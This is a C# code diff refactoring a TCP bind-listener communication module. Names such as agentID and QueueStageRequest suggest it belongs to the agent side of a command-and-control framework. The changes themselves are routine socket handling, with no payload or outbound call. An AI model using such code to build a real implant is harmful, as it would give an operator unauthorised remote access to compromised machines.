@@ -9,6 +9,8 @@ class TcpCommModule : CommModule
     static string BindAddress;
     static int BindPort;
 
+    TcpListener Listener;
+
     static ManualResetEvent Status = new ManualResetEvent(false);
 
     public TcpCommModule(string agentID, string bindAddress, int bindPort) : base(agentID)
@@ -21,15 +23,25 @@ class TcpCommModule : CommModule
     {
         base.Start(crypto);
 
-        var listener = new TcpListener(IPAddress.Parse(BindAddress), BindPort);
-        listener.Start();
+        Listener = new TcpListener(IPAddress.Parse(BindAddress), BindPort);
+        Listener.Start();
 
         while (ModuleStatus == ModuleStatus.Running)
         {
             Status.Reset();
-            listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), listener);
+            var state = new CommStateObject();
+            Listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), state);
             Status.WaitOne();
+
+            Thread.Sleep(1000);
         }
+    }
+
+    public override void Stop()
+    {
+        base.Stop();
+
+        Listener.Stop();
     }
 
     public void QueueStageRequest()
@@ -51,17 +63,13 @@ class TcpCommModule : CommModule
     {
         Status.Set();
 
-        var listener = ar.AsyncState as TcpListener;
+        var state = ar.AsyncState as CommStateObject;
 
         if (ModuleStatus == ModuleStatus.Running)
         {
-            var handler = listener.EndAcceptTcpClient(ar);
+            var handler = Listener.EndAcceptTcpClient(ar);
             var stream = handler.GetStream();
-            var state = new CommStateObject
-            {
-                Worker = handler
-            };
-
+            state.Worker = stream;
             stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
         }
     }
